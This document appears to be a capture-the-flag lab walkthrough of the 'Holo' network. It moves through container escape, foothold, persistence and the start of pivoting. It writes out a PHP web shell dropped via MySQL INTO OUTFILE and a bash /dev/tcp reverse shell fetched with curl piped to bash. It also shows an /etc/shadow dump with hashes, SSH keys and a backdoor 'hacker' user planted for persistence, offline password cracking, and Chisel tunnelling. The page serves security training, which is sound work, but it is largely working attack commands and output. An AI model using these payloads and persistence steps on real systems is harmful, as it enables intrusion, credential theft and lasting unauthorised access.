Now that you have identified that you are in a container and have performed all the information gathering and situational awareness you can, you can escape the container by exploiting the remote database.
There are several ways to escape a container, all typically stemming from misconfigurations of the container from services or access controls.
For more information about container best practices and docker security, check out this OWASP cheat-sheet, [https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html).
A method that's not quite as common is Exploitation. Exploits to escape Containers aren't as common and typically rely on abusing a process running on the host machine. Exploits usually require some level of user interaction, for example, [CVE-2019-14271](https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/). It can also be beneficial to use a container enumeration script such as DEEPCE, [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce).
Since we gained access to a remote database, we can utilize it to gain command execution and escape the container from MySQL.
The basic methodology for exploiting MySQL can be found below.
-   Access the remote database using administrator credentials
-   Create a new table in the main database
-   Inject PHP code to gain command execution
Example code: `<?php $cmd=$_GET["cmd"];system($cmd);?>`
-   Drop table contents onto a file the user can access
-   Execute and obtain RCE on the host.
Looking at the above exploit may seem complicated, but we can break it down further and provide more context to make it simpler.
We can use a single command to inject our PHP code into a table and save the table into a file on the remote system. We are writing any code that we want onto the remote system from this command, which we can then execute, giving use code execution. Find the command used below.
Command used: `select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`
Now that we have a file that we control dropped on the system, we can curl the address and obtain RCE from the dropped file. Find example usage below.
Example usage: `curl 127.0.0.1:8080/shell.php?cmd=whoami`
Answer the questions below
```sql
mysql> show grants for admin;
show grants for admin;
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Grants for admin@%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, SHUTDOWN, PROCESS, FILE, REFERENCES, INDEX, ALTER, SHOW DATABASES, SUPER, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE, REPLICATION CLIENT, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, CREATE USER, EVENT, TRIGGER, CREATE TABLESPACE, CREATE ROLE, DROP ROLE ON *.* TO `admin`@`%`                                                                                                                                               |
| GRANT APPLICATION_PASSWORD_ADMIN,AUDIT_ADMIN,BACKUP_ADMIN,BINLOG_ADMIN,BINLOG_ENCRYPTION_ADMIN,CLONE_ADMIN,CONNECTION_ADMIN,ENCRYPTION_KEY_ADMIN,GROUP_REPLICATION_ADMIN,INNODB_REDO_LOG_ARCHIVE,INNODB_REDO_LOG_ENABLE,PERSIST_RO_VARIABLES_ADMIN,REPLICATION_APPLIER,REPLICATION_SLAVE_ADMIN,RESOURCE_GROUP_ADMIN,RESOURCE_GROUP_USER,ROLE_ADMIN,SERVICE_CONNECTION_ADMIN,SESSION_VARIABLES_ADMIN,SET_USER_ID,SHOW_ROUTINE,SYSTEM_USER,SYSTEM_VARIABLES_ADMIN,TABLE_ENCRYPTION_ADMIN,XA_RECOVER_ADMIN ON *.* TO `admin`@`%` |
| GRANT ALL PRIVILEGES ON `DashboardDB`.* TO `admin`@`%`                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
3 rows in set (0.00 sec)

mysql> CREATE TABLE hacker ( hacker varchar(255) );
CREATE TABLE hacker ( hacker varchar(255) );
Query OK, 0 rows affected (0.03 sec)

mysql> INSERT INTO hacker (hacker) VALUES ('<?php $cmd=$_GET["cmd"];system($cmd);?>');
INSERT INTO hacker (hacker) VALUES ('<?php $cmd=$_GET["cmd"];system($cmd);?>');
Query OK, 1 row affected (0.00 sec)

mysql> SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
Query OK, 1 row affected (0.00 sec)

mysql> exit
exit
Bye

www-data@2e332f92060f:/var/www/admin$ curl 192.168.100.1:8080/shell.php?cmd=whoami
mirl 192.168.100.1:8080/shell.php?cmd=whoam
www-data
```
```sql
┌──(kali㉿kali)-[~/Holo]
└─$ nano rev.sh
```
```sql
┌──(kali㉿kali)-[~/Holo]
└─$ cat rev.sh
#!/bin/bash
bash -i >& /dev/tcp/10.50.104.206/5555 0>&1

curl 'http://192.168.100.1:8080/shell.php?cmd=curl http://10.50.104.206:8000/rev.sh|bash &'

url encode

curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.104.206%3A8000%2Frev.sh%7Cbash%20%26'

revshell (scaping docker)

www-data@2e332f92060f:/var/www/admin$ curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.104.206%3A8000%2Frev.sh%7Cbash%20%26'
cmd=curl%20http%3A%2F%2F10.50.104.206%3A8000%2Frev.sh%7Cbash%20%26'
```
```sql
┌──(kali㉿kali)-[~/Holo]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.200.108.33 - - [31/Jan/2023 21:39:52] "GET /rev.sh HTTP/1.1" 200 -
```
```sql
┌──(kali㉿kali)-[~/Holo]
└─$ rlwrap nc -lvnp 5555
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.200.108.33.
Ncat: Connection from 10.200.108.33:57674.
bash: cannot set terminal process group (2176): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-200-108-33:/var/www/html$ whoami
whoami
www-data

www-data@ip-10-200-108-33:/var/www$ cat user.txt
cat user.txt
HOLO{3792d7d80c4dcabb8a533afddf06f666}
```
Read the above and exploit the database.
Completed
What user is the database running as?
*www-data*
### Docker Breakout Going%20out%20with%20a%20SHEBANG%21
Now that you have escaped the container and have RCE on the host, you need to create a reverse shell and obtain a way to gain a stable shell onto the box.
There are several ways to obtain a reverse shell on a box once you have RCE. Outlined below are a few of the most common methods used.
-   netcat
-   bash
-   python
-   perl
For more information about various payloads and reverse shells, you can use check out these two resources. [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
In this task, we will be covering how to use a basic bash reverse shell along with URL encoding to drop a script directly into bash. Using URL encoding to our advantage, we can ease much pain when executing a payload as often special characters such as `&, ', !, ;, ?` will cause serious issues.
To begin, we will create a simple payload by placing the below code into a `.sh` file.
`#!/bin/bash   bash -i >& /dev/tcp/tun0ip/53 0>&1`
The first line will declare that we are using the bash scripting language. The second line is the payload itself. For more information about this payload, check out this explain shell, [https://explainshell.com/explain?cmd=bash+-i+>%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0>%261](https://explainshell.com/explain?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0%3E%261).
Now that you have the payload ready to go, you can start up a local web server on your attacking machine using either _http.server_ or _updog_ or _php_. You can find example usage for all three below.
-   `python3 -m http.server 80`
-   `updog`
-   `php -S 0.0.0.0:80`
Once you have a server started hosting the file, we can compile a command to execute the file. Find the command below.
Unencoded command: `curl http://10.x.x.x:80/shellscript.sh|bash &`
As we have already mentioned, special characters can cause issues within URLs. To combat this, we can utilize URL encoding on any special characters. Find the encoded command below.
Encoded command: `curl%20http%3A%2F%2F10.x.x.x%3A80%2Fshellscript.sh%7Cbash%20%26`
The above command is entirely ready to go. You will only need to change the IP address and the file name within the command; this does not require you to change any of the URL encoding present.
You can now start a listener using Netcat or Metasploit to catch your reverse shell once executed. Find commands below to start listeners.
-   `nc -lvnp 53`
-   `use exploit/multi/handler`
Now that you have the full payload and execution command ready, you can use it and the RCE to gain a shell onto the box. Find the full command below.
Command used: `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.x.x.x%3A80%2Fshellscript.sh%7Cbash%20%26'`
Answer the questions below
Obtain a shell on L-SRV01 and submit the user flag on Task 4.
*HOLO{3792d7d80c4dcabb8a533afddf06f666}*
Now that we have gained a decent foothold onto the network and have a stable shell, we can worry about setting up persistence so that we don't lose our foothold and gain our foothold again if the machine is reset or our shell gets terminated. There are many methods for persistence outlined below are a few examples.
-   LD_PRELOAD
-   Backdoored binaries
-   PAM backdoor
-   SSH keys
-   Malicious services
-   Cronjob
-   Credential harvesting
In this room, we will be focusing on credential harvesting specifically from the shadow file and how to crack passwords offline to gain long-term account access.
For more information about persistence techniques check out MITRE ATT&CK [TA0003](https://attack.mitre.org/tactics/TA0003/).
---
To begin with our persistence adventures, we will be focusing on dumping the shadow file on a Linux server. The shadow file is located in `/etc/shadow` and contains encrypted passwords and related information, including usernames, password change date, expiration, etc. We can use this file to retrieve hashes as an attacker and then attempt to crack the hashes using an offline hash cracking tool like Hashcat or JohntheRipper.
Since the shadow file is a standard in the Linux kernel to authenticate accounts, you can expect it on every *nix machine you encounter.
To dump the shadow file is simple; once you have root privileges, you need to read the file, and the machine will output the information in the shadow file. Find an example command below.
Command used: `cat /etc/shadow`
![](https://i.imgur.com/we37uWq.png)
We now have all the account hashes stored by the system. From here, we can take them offline and attempt to crack them in the next task.
Answer the questions below
```text
root@85e950a1a8ca:~# cat /etc/shadow      cat /etc/shadow
cat /etc/shadow
root:$6$TvYo6Q8EXPuYD8w0$Yc.Ufe3ffMwRJLNroJuMvf5/Telga69RdVEvgWBC.FN5rs9vO0NeoKex4jIaxCyWNPTDtYfxWn.EM4OLxjndR1:18605:0:99999:7:::
daemon:*:18512:0:99999:7:::
bin:*:18512:0:99999:7:::
sys:*:18512:0:99999:7:::
sync:*:18512:0:99999:7:::
games:*:18512:0:99999:7:::
man:*:18512:0:99999:7:::
lp:*:18512:0:99999:7:::
mail:*:18512:0:99999:7:::
news:*:18512:0:99999:7:::
uucp:*:18512:0:99999:7:::
proxy:*:18512:0:99999:7:::
www-data:*:18512:0:99999:7:::
backup:*:18512:0:99999:7:::
list:*:18512:0:99999:7:::
irc:*:18512:0:99999:7:::
gnats:*:18512:0:99999:7:::
nobody:*:18512:0:99999:7:::
systemd-network:*:18512:0:99999:7:::
systemd-resolve:*:18512:0:99999:7:::
systemd-timesync:*:18512:0:99999:7:::
messagebus:*:18512:0:99999:7:::
syslog:*:18512:0:99999:7:::
_apt:*:18512:0:99999:7:::
tss:*:18512:0:99999:7:::
uuidd:*:18512:0:99999:7:::
tcpdump:*:18512:0:99999:7:::
sshd:*:18512:0:99999:7:::
landscape:*:18512:0:99999:7:::
pollinate:*:18512:0:99999:7:::
ec2-instance-connect:!:18512:0:99999:7:::
systemd-coredump:!!:18566::::::
ubuntu:!$6$6/mlN/Q.1gopcuhc$7ymOCjV3RETFUl6GaNbau9MdEGS6NgeXLM.CDcuS5gNj2oIQLpRLzxFuAwG0dGcLk1NX70EVzUUKyUQOezaf0.:18601:0:99999:7:::
lxd:!:18566::::::
mysql:!:18566:0:99999:7:::
dnsmasq:*:18566:0:99999:7:::
linux-admin:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:18570:0:99999:7:::

generate sshkey and insert to “root” and “linux-admin” user “authorized_keys”
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ ssh-keygen -t rsa -f fake_id_rsa -P "" && cat fake_id_rsa.pub
Generating public/private rsa key pair.
Your identification has been saved in fake_id_rsa
Your public key has been saved in fake_id_rsa.pub
The key fingerprint is:
SHA256:lLOd7eBB/n816vYrF3tiUDZkKOwnqkMXtBH63Hwf940 kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|        .o   .   |
|       .o.o . o  |
|      ..++.. o   |
|       +oOoo. +  |
|        SoOooo...|
|      . o. *.. *+|
|     . o  . o.E B|
|      o      =ooo|
|       .    oo==o|
+----[SHA256]-----+
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApCxN/8yQ80PPTaxAyPK1MtnGXwXXHGeU1Z4EEjoBO0ytje16zRvMK5SplHJbaE9UWLSdfVioewXbv0yFsphkO2ex5njB/jfyjuCK8Jhzm/xSOcGMlgr3Ew9/U/Nq2eS8DWP2HbB9KG5IC7F0GnROGEvkIOJUTddEKL7aBUE0Xz/RxjMeaZ+DKbbB9zDwGRGC1bN9Xzl79vnqRHGV7Q9jgCQdcBvMDIBHjTS/MboY04xIh48jmSXRKVd8Xp9WMlK9YTXmha3KIOgEZaQp+XcFWnB812ns1v3OIM+tq9KElglz5Q65czn9Szw4vu/OFxgvYozwpH7pxeX8wb+oFszr6NMbTFx+vZyzneXP2jlZ9ckV+GIZgDEE08SP9lqaG36+CvEIWNxeLJHmA4h9xpb59HKaflULU9TNmPyzIoI1RNfOBOiDzJ3ce1OKKDa2nG96dKPGpdxSie/zezi82rUrXG9vyKIpLlUC2trFZT1NKsKfAEDWfB28M+MpPd4k/a8= kali@kali

root@85e950a1a8ca:~# cd .ssh              cd .ssh
cd .ssh
root@85e950a1a8ca:~/.ssh# ls                        ls
ls
authorized_keys
root@85e950a1a8ca:~/.ssh# cat authorized_keys       cat authorized_keys
cat authorized_keys
no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwAH4BS4b+rdtLqwwIBFUCTjLnA0HLYETxBjWLJnrmXoWIvq6M1oxX154NhG10DDmBaYjgCMQllCFaUDIMlZoNMJvqeYbDgt/B51v47c0SCaQnu4nQapgUQqjhwlTp3Humj7bvvKZHV2ATcZdLOK6E170YvdweMTjrI9n3L5AyZTsoSV7vlHCYmNH60SGG0JWGNRLT0ddpTP+ZY4g6RvfFFh/dwryoZXn2xmbdK44okuYgWU5BLBbMR0S8HmVf5lE+g7K3kc/a7k+A36zSjt+Ay/rxstFAmL7gJcRw4+33alsi0HvTh3Q7Nt4y3GWGySML51JwMQL/jQESIBuMnMgv ad-network
no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN

root@85e950a1a8ca:~/.ssh# echo "ssh-rsa AAAAB3NzaC1yecho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApCxN/8yQ80PPTaxAyPK1MtnGXwXXHGeU1Z4EEjoBO0ytje16zRvMK5SplHJbaE9UWLSdfVioewXbv0yFsphkO2ex5njB/jfyjuCK8Jhzm/xSOcGMlgr3Ew9/U/Nq2eS8DWP2HbB9KG5IC7F0GnROGEvkIOJUTddEKL7aBUE0Xz/RxjMeaZ+DKbbB9zDwGRGC1bN9Xzl79vnqRHGV7Q9jgCQdcBvMDIBHjTS/MboY04xIh48jmSXRKVd8Xp9WMlK9YTXmha3KIOgEZaQp+XcFWnB812ns1v3OIM+tq9KElglz5Q65czn9Szw4vu/OFxgvYozwpH7pxeX8wb+oFszr6NMbTFx+vZyzneXP2jlZ9ckV+GIZgDEE08SP9lqaG36+CvEIWNxeLJHmA4h9xpb59HKaflULU9TNmPyzIoI1RNfOBOiDzJ3ce1OKKDa2nG96dKPGpdxSie/zezi82rUrXG9vyKIpLlUC2trFZT1NKsKfAEDWfB28M+MpPd4k/a8=" >> authorized_keys

root@85e950a1a8ca:~/.ssh# cat authorized_keys       cat authorized_keys
cat authorized_keys
no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwAH4BS4b+rdtLqwwIBFUCTjLnA0HLYETxBjWLJnrmXoWIvq6M1oxX154NhG10DDmBaYjgCMQllCFaUDIMlZoNMJvqeYbDgt/B51v47c0SCaQnu4nQapgUQqjhwlTp3Humj7bvvKZHV2ATcZdLOK6E170YvdweMTjrI9n3L5AyZTsoSV7vlHCYmNH60SGG0JWGNRLT0ddpTP+ZY4g6RvfFFh/dwryoZXn2xmbdK44okuYgWU5BLBbMR0S8HmVf5lE+g7K3kc/a7k+A36zSjt+Ay/rxstFAmL7gJcRw4+33alsi0HvTh3Q7Nt4y3GWGySML51JwMQL/jQESIBuMnMgv ad-network
no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApCxN/8yQ80PPTaxAyPK1MtnGXwXXHGeU1Z4EEjoBO0ytje16zRvMK5SplHJbaE9UWLSdfVioewXbv0yFsphkO2ex5njB/jfyjuCK8Jhzm/xSOcGMlgr3Ew9/U/Nq2eS8DWP2HbB9KG5IC7F0GnROGEvkIOJUTddEKL7aBUE0Xz/RxjMeaZ+DKbbB9zDwGRGC1bN9Xzl79vnqRHGV7Q9jgCQdcBvMDIBHjTS/MboY04xIh48jmSXRKVd8Xp9WMlK9YTXmha3KIOgEZaQp+XcFWnB812ns1v3OIM+tq9KElglz5Q65czn9Szw4vu/OFxgvYozwpH7pxeX8wb+oFszr6NMbTFx+vZyzneXP2jlZ9ckV+GIZgDEE08SP9lqaG36+CvEIWNxeLJHmA4h9xpb59HKaflULU9TNmPyzIoI1RNfOBOiDzJ3ce1OKKDa2nG96dKPGpdxSie/zezi82rUrXG9vyKIpLlUC2trFZT1NKsKfAEDWfB28M+MpPd4k/a8=

now linux-admin

root@85e950a1a8ca:/home# cd linux-admin           cd linux-admin
cd linux-admin
root@85e950a1a8ca:/home/linux-admin# ls                                   ls
ls
root@85e950a1a8ca:/home/linux-admin# ls -lah                              ls -lah
ls -lah
total 24K
drwxr-xr-x 3 linux-admin linux-admin 4.0K Jan  4  2021 .
drwxr-xr-x 5 root        root        4.0K Nov  4  2020 ..
lrwxrwxrwx 1 root        root           9 Dec  5  2020 .bash_history -> /dev/null
-rw-r--r-- 1 linux-admin linux-admin  220 Nov  4  2020 .bash_logout
-rw-r--r-- 1 linux-admin linux-admin 3.7K Nov  4  2020 .bashrc
drwx------ 2 linux-admin linux-admin 4.0K Dec  5  2020 .cache
-rw-r--r-- 1 linux-admin linux-admin  807 Nov  4  2020 .profile
root@85e950a1a8ca:/home/linux-admin# cd .ssh                              cd .ssh
cd .ssh
bash: cd: .ssh: No such file or directory
root@85e950a1a8ca:/home/linux-admin# mkdir .ssh                           mkdir .ssh
mkdir .ssh
root@85e950a1a8ca:/home/linux-admin# cd .ssh                              cd .ssh
cd .ssh

root@85e950a1a8ca:/home/linux-admin/.ssh#                                           echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApCxN/8yQ80PPTaxAyPK1MtnGXwXXHGeU1Z4EEjoBO0ytje16zRvMK5SplHJbaE9UWLSdfVioewXbv0yFsphkO2ex5njB/jfyjuCK8Jhzm/xSOcGMlgr3Ew9/U/Nq2eS8DWP2HbB9KG5IC7F0GnROGEvkIOJUTddEKL7aBUE0Xz/RxjMeaZ+DKbbB9zDwGRGC1bN9Xzl79vnqRHGV7Q9jgCQdcBvMDIBHjTS/MboY04xIh48jmSXRKVd8Xp9WMlK9YTXmha3KIOgEZaQp+XcFWnB812ns1v3OIM+tq9KElglz5Q65czn9Szw4vu/OFxgvYozwpH7pxeX8wb+oFszr6NMbTFx+vZyzneXP2jlZ9ckV+GIZgDEE08SP9lqaG36+CvEIWNxeLJHmA4h9xpb59HKaflULU9TNmPyzIoI1RNfOBOiDzJ3ce1OKKDa2nG96dKPGpdxSie/zezi82rUrXG9vyKIpLlUC2trFZT1NKsKfAEDWfB28M+MpPd4k/a8=" >> authorized_keys
yKIpLlUC2trFZT1NKsKfAEDWfB28M+MpPd4k/a8=" >> authorized_keyspdxSie/zezi82rUrXG9vy
root@85e950a1a8ca:/home/linux-admin/.ssh# cat authorized_keys                        cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApCxN/8yQ80PPTaxAyPK1MtnGXwXXHGeU1Z4EEjoBO0ytje16zRvMK5SplHJbaE9UWLSdfVioewXbv0yFsphkO2ex5njB/jfyjuCK8Jhzm/xSOcGMlgr3Ew9/U/Nq2eS8DWP2HbB9KG5IC7F0GnROGEvkIOJUTddEKL7aBUE0Xz/RxjMeaZ+DKbbB9zDwGRGC1bN9Xzl79vnqRHGV7Q9jgCQdcBvMDIBHjTS/MboY04xIh48jmSXRKVd8Xp9WMlK9YTXmha3KIOgEZaQp+XcFWnB812ns1v3OIM+tq9KElglz5Q65czn9Szw4vu/OFxgvYozwpH7pxeX8wb+oFszr6NMbTFx+vZyzneXP2jlZ9ckV+GIZgDEE08SP9lqaG36+CvEIWNxeLJHmA4h9xpb59HKaflULU9TNmPyzIoI1RNfOBOiDzJ3ce1OKKDa2nG96dKPGpdxSie/zezi82rUrXG9vyKIpLlUC2trFZT1NKsKfAEDWfB28M+MpPd4k/a8=

adding an user

This command creates a new user account named "hacker" on a Linux system. The "-m" option creates a home directory for the new user, which is typically located at "/home/hacker".

root@85e950a1a8ca:/home/linux-admin/.ssh# useradd -m hacker                         useradd -m hacker
useradd -m hacker
root@85e950a1a8ca:/home/linux-admin/.ssh# cd ../..                                  cd ../..
cd ../..
root@85e950a1a8ca:/home# ls -la                   ls -la
ls -la
total 24
drwxr-xr-x  6 root        root        4096 Feb  1 03:19 .
drwxr-xr-x 18 root        root        4096 Feb  1 02:07 ..
drwxr-xr-x  6 root        root        4096 Jan 16  2021 docker
drwxr-xr-x  2 hacker      hacker      4096 Feb  1 03:19 hacker
drwxr-xr-x  4 linux-admin linux-admin 4096 Feb  1 03:12 linux-admin
drwxr-xr-x  4 ubuntu      ubuntu      4096 Dec  9  2020 ubuntu

This command appears to be changing the password for a user named "hacker" to "hacker". The "chpasswd" command is used to change passwords for multiple users in a batch mode, and the input to the command is in the format of "username:password". So in this example, the password for the "hacker" user is being set to "hacker".

echo hacker:hacker | chpasswd

now using hashcat
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ cat hash  
$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt

or using john
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash         
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:09:45 2.75% (ETA: 17:48:56) 0g/s 784.9p/s 784.9c/s 784.9C/s tree01..torres69
0g 0:00:20:03 6.90% (ETA: 16:45:07) 0g/s 937.2p/s 937.2c/s 937.2C/s 07120857..070000034
0g 0:00:24:57 8.92% (ETA: 16:34:26) 0g/s 956.9p/s 956.9c/s 956.9C/s nov201994..noura1991
0g 0:00:31:18 11.14% (ETA: 16:35:32) 0g/s 942.1p/s 942.1c/s 942.1C/s gogettas..godsjoy1
0g 0:00:45:29 17.12% (ETA: 16:20:15) 0g/s 980.6p/s 980.6c/s 980.6C/s xiaomao1016heqi..xiao519
0g 0:00:49:50 19.63% (ETA: 16:08:31) 0g/s 1013p/s 1013c/s 1013C/s tweedledee!..twd103cute67
0g 0:00:59:28 25.31% (ETA: 15:49:33) 0g/s 1068p/s 1068c/s 1068C/s shellyrn8..shelly45
0g 0:01:15:38 35.04% (ETA: 15:30:28) 0g/s 1139p/s 1139c/s 1139C/s nazare89..naz5322
0g 0:01:20:10 37.98% (ETA: 15:25:43) 0g/s 1159p/s 1159c/s 1159C/s miami2905..miam98
linuxrulez       (?)     
1g 0:01:27:31 DONE () 0.000190g/s 1174p/s 1174c/s 1174C/s linz1962..linuxlife16
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

after 0:01:27:31 

linuxadmin:linuxrulez
```
Read the above and dump the shadow file on L-SRV01.
Completed
What non-default user can we find in the shadow file on L-SRV01?
*linux-admin*
A somewhat important part of red team operations is hash cracking. We can use hashcat or johntheripper to crack a provided hash by comparing it against a provided wordlist such as rockyou.txt. In this task, we will be using the power of google colab to crack hashes for us.
From google colaboratory, "Colaboratory, or "Colab" for short, allows you to write and execute Python in your browser" This means that we can take advantage of it with pre-built workspaces to install and run hashcat on google's cloud infrastructure and crack our hashes with a high-end GPU.
To begin using colabcat, we will need to identify the Hashcat mode to use against the hashes. The shadow file uses the generic Linux hash `$6$`; this is a sha512crypt, which we can identify as mode 1800. For more information about hashcat types, check out the hashcat example page, [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes).
Now we can use the colabcat repo, [https://github.com/someshkar/colabcat](https://github.com/someshkar/colabcat), to start up a colab instance with the hashcat settings pre-prepared.
**Note:** To use colabcat you will first need a google account.
To begin preparing the instance, you need to follow the prompts and execute the pre-set commands in each box. Find an example of running pre-set commands below.
![](https://i.imgur.com/1vjYZKd.png)
Continue following the prompts to authorize your google account to connect to the colab instance. The below box is the step at which we can change the commands to crack our hashes.
![](https://i.imgur.com/1q81Bi8.png)
To begin cracking your hash, place the shadow hash inside of `/root/.hashcat/hashes/shadow.hash`. You can then specify the wordlist you would like to use to crack the hash; we recommend using rockyou.txt, to begin.
Answer the questions below
Read the above and attempt to crack the shadow hash.
Completed
What is the plaintext cracked password from the shadow hash?
*linuxrulez*
### Pivoting Digging a tunnel to nowhere
Now that you have gained root access to L-SRV01, you need to identify where to go next. You know there are no other external machines in scope, so you decide to move into the internal network. To gain access to the internal subnet, you need to perform what is known as pivoting.
In a well-maintained network, often referred to as a "Segmented Network," there are specific rules in place preventing users from accessing certain parts of the Internal LAN (ex. The Workstation Subnet should not be able to access the Server Subnet). We will need to "pivot" from an already compromised server using a SOCKs server or other means like port forwarding to access different network resources.
There are several tools outlined below that can help us in pivoting.
-   sshuttle
-   Chisel
-   Ligolo
-   Metasploit autoroute
In this task, we will be focusing on both Chisel and sshuttle, each offering unique ways to approach pivoting.
The first tool that we will be looking at is Chisel. From the Chisel GitHub, "Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable, including both client and server. Written in Go (Golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network."
From the Chisel GitHub, below is an overview of chisel architecture.
To begin using Chisel, we must first download the tool. If you utilize the stable release or docker, you will not need to download any dependencies. If you compile from source, you will need to install a few dependencies outlined on their GitHub. There are three common ways of obtaining the tool, outlined below.
-   Stable release: [](https://github.com/jpillora/chisel/releases)[https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
-   Docker: `docker run --rm -it jpillora/chisel --help`
-   Source: `go get -v [github.com/jpillora/chisel](<http://github.com/jpillora/chisel>)`
To set up the Chisel server on a Windows machine, you will need to get the Windows binary and vice versa.
To create a SOCKs server with Chisel, you will only need two commands ran on the target and the attacking machine, outlined below.
On the attacking machine: `./chisel server -p 8000 --reverse`
On the target machine: `./chisel client <SERVER IP>:8000 R:socks`
